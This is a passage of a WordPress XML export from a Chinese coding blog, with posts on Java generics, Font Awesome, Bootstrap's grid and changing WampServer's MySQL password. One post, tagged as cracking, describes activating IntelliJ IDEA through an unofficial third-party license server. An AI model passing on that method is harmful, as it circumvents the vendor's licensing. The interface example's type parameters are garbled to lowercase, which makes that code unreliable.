    public void mothed1(T t){
        System.out.println("SomeThing"+t);
    }
    public &lt;B&gt; void mothed2(B b){
        System.out.println("AnthorSomeThing"+b);
    }
}
public class Main {
<code></code>    public static void main(String[] args) {
        Tools&lt;String&gt; t = new Tools&lt;String&gt;();
        t.mothed1("123");
        t.mothed1(4);//报错
        t.mothed2(4);//编译成功
    }
}</pre>

&nbsp;
一个小知识：静态方法不能访问类上定义的泛型。

<pre>class Tools&lt;T&gt;{
    public void method1(T t){
        System.out.println("SomeThing"+t);
    }
    public static void method2(T t){
        System.out.println("AnthorSomeThing"+t);
    }
}
public class Main {
<code></code>    public static void main(String[] args) {
        Tools&lt;String&gt; t = new Tools&lt;String&gt;();
        t.method1("123");
        t.method2(4);
    }
}</pre>

编译时报：无法从静态上下文中引用非静态 类 T，所以我们需要进行改动：

<pre>class Tools&lt;T&gt;{
    public void method1(T t){
        System.out.println("SomeThing"+t);
    }
    public static &lt;Q&gt; void method2(Q t){
        System.out.println("AnthorSomeThing"+t);
    }
}
public class Main {
<code></code>    public static void main(String[] args) {
        Tools&lt;String&gt; t = new Tools&lt;String&gt;();
        t.method1("123");
        Tools.method2(4);
    }
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1050</wp:post_id>
		<wp:post_date><![CDATA[2016-02-25 19:20:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-25 11:20:29]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b9%8b%e5%9c%a8%e6%96%b9%e6%b3%95%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%b3%9b%e5%9e%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e6%96%b9%e6%b3%95"><![CDATA[方法]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b"><![CDATA[泛型]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b%e6%96%b9%e6%b3%95"><![CDATA[泛型方法]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[258]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>IntelliJ IDEA 15 联网激活</title>
		<link>https://www.nervgeek.com/2016/02/28/intellij-idea-15-%e8%81%94%e7%bd%91%e6%bf%80%e6%b4%bb/</link>
		<pubDate>Sun, 28 Feb 2016 11:40:35 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1074</guid>
		<description></description>
		<content:encoded><![CDATA[直接利用iteblog博客提供的License server（服务器地址为<a title="" href="http://www.iteblog.com/idea/key.php" target="_blank" data-original-title="http://www.iteblog.com/idea/key.php">http://www.iteblog.com/idea/key.php</a>），注册Idea 15的，依次选择菜单<code>Help-&gt;Register-&gt;License server</code>即可，如下：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/idea_server_iteblog.png" rel="attachment wp-att-1077"><img class="size-full wp-image-1077 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/02/idea_server_iteblog.png" alt="idea_server_iteblog" width="446" height="446" /></a>
不过这种方式需要保证你电脑在启动Idea的时候能够连上网。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1074</wp:post_id>
		<wp:post_date><![CDATA[2016-02-28 19:40:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-28 11:40:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[intellij-idea-15-%e8%81%94%e7%bd%91%e6%bf%80%e6%b4%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="idea"><![CDATA[IDEA]]></category>
		<category domain="post_tag" nicename="intellij"><![CDATA[IntelliJ]]></category>
		<category domain="post_tag" nicename="intellij-idea-15"><![CDATA[IntelliJ IDEA 15]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="jetbrains"><![CDATA[JetBrains]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a0%b4%e8%a7%a3"><![CDATA[破解]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[410]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>在网页中使用本地Font Awesome矢量图标</title>
		<link>https://www.nervgeek.com/2016/02/29/%e5%9c%a8%e7%bd%91%e9%a1%b5%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%9c%ac%e5%9c%b0font-awesome%e7%9f%a2%e9%87%8f%e5%9b%be%e6%a0%87/</link>
		<pubDate>Mon, 29 Feb 2016 04:49:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1080</guid>
		<description></description>
		<content:encoded><![CDATA[<i class="icon-download"></i> 下载地址：<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/font-awesome.rar" rel="">font-awesome
</a>
<i class="icon-link"></i> 使用参考：<a href="http://9iphp.com/fa-icons">FontAwesome 4.4.0 中完整的585个图标样式CSS参考</a>（本站提供的是4.5.0版本，新增的图标可以上官网看一下）
将整理好的文件夹加入到你的网站，新建一个测试页面 demo.html，将css文件夹中的两个css文件，引入到页面。

<div class="cnblogs_code">
<pre><link href="fontawesome/css/font-awesome.min.css" rel="stylesheet" /></pre>
简单的使用案例：
<pre>
<span style="font-size:12px;"><i class="fa fa-link"></i> 链接</span>
<span style="font-size:20px;"><i class="fa fa-link"></i> 链接</span>
<span style="color:red"><i class="fa fa-link"></i> 链接</span>
<span style="color:white;background-color:#003399;"><i class="fa fa-link"></i> 链接</span>
</pre>
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1080</wp:post_id>
		<wp:post_date><![CDATA[2016-02-29 12:49:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-29 04:49:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9c%a8%e7%bd%91%e9%a1%b5%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%9c%ac%e5%9c%b0font-awesome%e7%9f%a2%e9%87%8f%e5%9b%be%e6%a0%87]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="font-awesome"><![CDATA[font awesome]]></category>
		<category domain="post_tag" nicename="web"><![CDATA[web]]></category>
		<category domain="post_tag" nicename="%e5%9b%be%e6%a0%87"><![CDATA[图标]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%9f%a2%e9%87%8f%e5%9b%be%e6%a0%87"><![CDATA[矢量图标]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
		<category domain="post_tag" nicename="%e8%ae%be%e8%ae%a1"><![CDATA[设计]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[251]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Bootstrap 栅格系统的精妙之处</title>
		<link>https://www.nervgeek.com/2016/03/01/bootstrap-%e6%a0%85%e6%a0%bc%e7%b3%bb%e7%bb%9f%e7%9a%84%e7%b2%be%e5%a6%99%e4%b9%8b%e5%a4%84/</link>
		<pubDate>Tue, 01 Mar 2016 07:05:32 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1088</guid>
		<description></description>
		<content:encoded><![CDATA[从接触 Bootstrap 已经有很长时间了，给人的感觉是快速，简单，易上手，其中栅格系统是一个亮点：
<strong>一直感觉像 CSS 栅格系统之类的东西拿过来用就好了，不用深究背后的原理。直到有一天你发现简单的套用在稍复杂的页面上出现问题，间隔啊，内外边距啊，哪都不对劲儿。</strong>
当然会有这样的过程，然后随着知识的积累，可以去读一些 Bootstrap 的源码，结合文档会发现一些不是很理解的地方：
<strong>“行（row）”必须包含在 .container （固定宽度）或 .container-fluid （100% 宽度）中，以便为其赋予合适的排列（aligment）和内补（padding）。</strong>
<!--more-->
<strong><span style="font-size: 24pt;">CONTAINER</span></strong>
<strong> Container 有两个作用： </strong>

<ol>
    <li>在随时可能的宽度变化(响应式)中提供宽度限制。当页面宽度变化，container 的宽度也随之变化。并且其中的 column 的宽度是基于百分比，所以他们的值不需要变化。</li>
    <li>提供一个水平方向的 padding，使其内部的内容不会接触到浏览器的边界，大小为15px，就是图片中粉红色的部分，作用会在下面说。</li>
</ol>

<strong>注意</strong>，不需要也不应该在 container 中嵌套另一个 container。
<img src="https://www.nervgeek.com/wp-content/uploads/2016/03/74513e0cda179230f7d62344869f004d.png" alt="" />
<strong><span style="font-size: 24pt;">ROW</span></strong>
Row 是 column 直接存在的容器，按照文档描述 row 中最多可有12个 column，不过可以通过 nesting 的方式灵活扩展。同时作为都是左浮动的 column 的 wrapper，自带 clearfix 的性质。
同时 row 还有一个很特殊的地方，就是左右各有 －15px 的 margin，就是图片中的蓝色部分。这样也就抵消了上面提到的 container 中15px的 padding，那么为什么要这么折腾呢？接着看往下读。
<img src="https://www.nervgeek.com/wp-content/uploads/2016/03/9723ad900afb276598e50d8831352f83.png" alt="" />
<strong><span style="font-size: 24pt;">COLUMN</span></strong>
注意啦，每个column 也会有15px的水平方向的 padding，也就是图片中黄色的部分，唉，先别急，会明白的。还记得上面提到的 row 的作用吗，colunmn 只能在 row 中生存，由于 row 的 margin 为－15px，那么位于两边的 column 就碰到了 container 的边界。但是 colunmn 本身又有 15px 的 padding 使得它其中的内容并不会碰到 container，同时 不同column的内容之间就有了30px的槽。结合图片看一下就一目了然了。
<img src="https://www.nervgeek.com/wp-content/uploads/2016/03/99565c1dcffd1a6b8e9ed3793f831805.png" alt="" />
<strong><span style="font-size: 24pt;">NESTING</span></strong>
<span style="font-size: 1.1em; line-height: 1.7;">当把上面一系列的 container, row, column 都设置好，就可以通过 nesting 扩展它的栅格系统了，也就是在 column 中直接嵌套 row，而不需要再套一层 container：</span>
<img src="https://www.nervgeek.com/wp-content/uploads/2016/03/78398040b43571737675990592ea5aa0.png" alt="" />
还记得 container 和 column 都有15px的 padding 吗，当 nesting 的时候 column 的作用也相当于 container 了，这样就可以实现任意的嵌套了。
<img src="https://www.nervgeek.com/wp-content/uploads/2016/03/f8f04e788210489bc1f64d055e39be9f.png" alt="" />
<strong>这正是 Bootstrap 的栅格系统的最巧妙的地方！</strong>
转至:<a href="https://segmentfault.com/a/1190000000743553">https://segmentfault.com/a/1190000000743553</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1088</wp:post_id>
		<wp:post_date><![CDATA[2016-03-01 15:05:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-01 07:05:32]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[bootstrap-%e6%a0%85%e6%a0%bc%e7%b3%bb%e7%bb%9f%e7%9a%84%e7%b2%be%e5%a6%99%e4%b9%8b%e5%a4%84]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="bootstrap"><![CDATA[Bootstrap]]></category>
		<category domain="post_tag" nicename="web"><![CDATA[web]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%a0%85%e6%a0%bc%e7%b3%bb%e7%bb%9f"><![CDATA[栅格系统]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e9%a1%b5%e8%ae%be%e8%ae%a1"><![CDATA[网页设计]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[203]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8743190417b3815dbc7dc41af5f09564]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java之在接口中使用泛型</title>
		<link>https://www.nervgeek.com/2016/03/01/java%e4%b9%8b%e5%9c%a8%e6%8e%a5%e5%8f%a3%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%b3%9b%e5%9e%8b/</link>
		<pubDate>Tue, 01 Mar 2016 07:24:52 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1096</guid>
		<description></description>
		<content:encoded><![CDATA[在接口上使用泛型并不多见，但还是需要学会看懂。

<pre>
interface Inter<t>{
    void show(T t);
}
class Intermpl<t> implements Inter<t>{
    public void show(T t){
        System.out.println(t);
    }
}
class Demo{
    public static void main(String[] args){
        Intermpl<string> imS = new Intermpl<string>();
        imS.show("a");
        Intermpl<integer> imI = new Intermpl<integer>();
        imI.show(123);
    }
}
</pre>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1096</wp:post_id>
		<wp:post_date><![CDATA[2016-03-01 15:24:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-01 07:24:52]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b9%8b%e5%9c%a8%e6%8e%a5%e5%8f%a3%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%b3%9b%e5%9e%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="interface"><![CDATA[interface]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e6%8e%a5%e5%8f%a3"><![CDATA[接口]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b"><![CDATA[泛型]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[195]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java之泛型中的通配符（）以及泛型限定</title>
		<link>https://www.nervgeek.com/2016/03/01/java%e4%b9%8b%e6%b3%9b%e5%9e%8b%e4%b8%ad%e7%9a%84%e9%80%9a%e9%85%8d%e7%ac%a6%ef%bc%88%ef%bc%89%e4%bb%a5%e5%8f%8a%e6%b3%9b%e5%9e%8b%e9%99%90%e5%ae%9a/</link>
		<pubDate>Tue, 01 Mar 2016 08:17:24 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1098</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 18pt;">问号通配符</span></strong>
Java的泛型中除了常用的<code>T t</code>之外，还有另一种通配符——&lt;?&gt;，问号通配符和<code>T t</code>通配符并没有非常大的区别，唯一的区别就是T t可以在泛型方法内使用，因为T t是一个具体类型，而问号并不是一个类型，只是一个占位符。

<pre>import java.util.*;
class Demo{
 public static void main(String[] args){
 ArrayList&lt;String&gt; al = new ArrayList&lt;String&gt;();
 al.add("Mr9esx01");
 al.add("Mr9esx02");
 al.add("Mr9esx03");
 ArrayList&lt;Integer&gt; al2 = new ArrayList&lt;Integer&gt;();
 al2.add(1);
 al2.add(2);
 al2.add(3);
 showArray(al2);
 }
 public static void showArray(ArrayList&lt;?&gt; al){
 Iterator&lt;?&gt; it = al.iterator();
 while(it.hasNext()){
 System.out.println(it.next());
 }
 }
}</pre>

&nbsp;
<!--more-->
<strong><span style="font-size: 18pt;">泛型限定</span></strong>
我们先创建两个类，<code>Student</code>和<code>Person</code>，<code>Student</code>继承<code>Person</code>。

<pre>class Person{
 private String name;
 Person(String name){
 this.name = name;
 }
 public String getName(){
 return name;
 }
}
class Student extends Person{
 Student(String name){
 super(name);
 }
}</pre>

如果执行下面的代码：

<pre>class Demo{
 public static void main(String[] args){
 ArrayList&lt;Person&gt; al = new ArrayList&lt;Person&gt;();
 al.add(new Person("Mr9esx01"));
 al.add(new Person("Mr9esx02"));
 al.add(new Person("Mr9esx03"));
 showArray(al);
 }
 public static void showArray(ArrayList&lt;Person&gt; al){
 Iterator&lt;Person&gt; it = al.iterator();
 while(it.hasNext()){
 System.out.println(it.next().getName());
 }
 }
}</pre>

程序正常运行输出。但假如我们泛型改成<code>Person</code>的子类<code>Student</code>的时候，就会发生错误：

<pre>class Demo{
 public static void main(String[] args){
 ArrayList&lt;Student&gt; al2 = new ArrayList&lt;Student&gt;();
 al2.add(new Student("Mr9esx01"));
 al2.add(new Student("Mr9esx02"));
 al2.add(new Student("Mr9esx03"));
 showArray(al2);
 }
 public static void showArray(ArrayList&lt;Person&gt; al){
 Iterator&lt;Person&gt; it = al.iterator();
 while(it.hasNext()){
 System.out.println(it.next().getName());
 }
 }
}</pre>

&nbsp;
<strong>因为子类除了继承父类，也可以有自己不同的方法、数据，会导致类型安全问题</strong>。
我们可以使用<strong>泛型限定</strong>这个方法来解决这个问题：

<pre>class Demo{
public static void main(String[] args){
ArrayList&lt;Person&gt; al = new ArrayList&lt;Person&gt;();
al.add(new Person("Mr9esx01"));
al.add(new Person("Mr9esx02"));
al.add(new Person("Mr9esx03"));
showArray(al);
ArrayList&lt;Student&gt; al2 = new ArrayList&lt;Student&gt;();
al2.add(new Student("Mr9esx01"));
al2.add(new Student("Mr9esx02"));
al2.add(new Student("Mr9esx03"));
showArray(al2);
}
public static void showArray(ArrayList&lt;? extends Person&gt; al){
Iterator&lt;? extends Person&gt; it = al.iterator();
while(it.hasNext()){
System.out.println(it.next().getName());
}
}
}</pre>

在普通的问号通配符后面加上<code>extends Person</code>，即可接收所有继承了<code>Person</code>父类的子类。
但泛型限定不止可以<strong>向上限定</strong>，也可以<strong>向下限定</strong>：

<ul>
    <li><code>? extends E</code>，接收E类型或者E的子类，向上限定。</li>
    <li><code>? super E</code>，接收E类型或者E的父类，向下限定。</li>
</ul>

&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1098</wp:post_id>
		<wp:post_date><![CDATA[2016-03-01 16:17:24]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-01 08:17:24]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b9%8b%e6%b3%9b%e5%9e%8b%e4%b8%ad%e7%9a%84%e9%80%9a%e9%85%8d%e7%ac%a6%ef%bc%88%ef%bc%89%e4%bb%a5%e5%8f%8a%e6%b3%9b%e5%9e%8b%e9%99%90%e5%ae%9a]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%8d%a0%e4%bd%8d%e7%ac%a6"><![CDATA[占位符]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b"><![CDATA[泛型]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b%e9%99%90%e5%ae%9a"><![CDATA[泛型限定]]></category>
		<category domain="post_tag" nicename="%e9%80%9a%e9%85%8d%e7%ac%a6"><![CDATA[通配符]]></category>
		<category domain="post_tag" nicename="%e9%97%ae%e5%8f%b7%e9%80%9a%e9%85%8d%e7%ac%a6"><![CDATA[问号通配符]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[354]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>修改WampServer的MySQL空密码</title>
		<link>https://www.nervgeek.com/2016/03/04/%e4%bf%ae%e6%94%b9wampserver%e7%9a%84mysql%e7%a9%ba%e5%af%86%e7%a0%81/</link>
		<pubDate>Fri, 04 Mar 2016 07:26:06 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1104</guid>
		<description></description>
		<content:encoded><![CDATA[在Windows下开发PHP，搭建Linux虚拟机无疑性能开销太大，自己在Windows下搭建PHP运行环境也非常麻烦、不稳定，因此很多人会使用WampServer这款软件来运行PHP。
但WampServer自带的MySQL的密码是空密码，非常不安全，所以我们第一时间需要修改MySQL密码。
修改WampServer的MySQL密码有两种方法：

<ul>
    <li>是通过phpMyAdmin直接修改。</li>
    <li>是使用WAMP的MySql控制台修改。</li>
</ul>

&nbsp;
这里先介绍第二种方法:

<ol>
    <li>打开WAMP的<a href="http://lib.csdn.net/base/14" target="_blank">mysql</a>控制台，提示输入密码，开始密码为空，直接按回车</li>
    <li>输入<code>use mysql</code>，控制台提示<code>Database changed</code></li>
    <li>输入<code>update user set password=PASSWORD('要修改的密码') where user='root';</code>，控制台提示<code>Query OK,xxxx</code></li>
    <li>最后输入<code>flush privileges</code>，提交</li>
    <li>输入<code>quit</code>，退出。</li>
    <li>在目录wamp\apps下找到phpmyadmin文件夹下的<code>config.inc.php</code>文件，</li>
    <li>修改<code>$cfg['Servers'][$i]['password'] = '';</code>为<code>$cfg['Servers'][$i]['password'] = '要修改的密码';</code></li>
    <li>重新启动服务</li>
</ol>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1104</wp:post_id>
		<wp:post_date><![CDATA[2016-03-04 15:26:06]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-04 07:26:06]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%bf%ae%e6%94%b9wampserver%e7%9a%84mysql%e7%a9%ba%e5%af%86%e7%a0%81]]></wp:post_name>
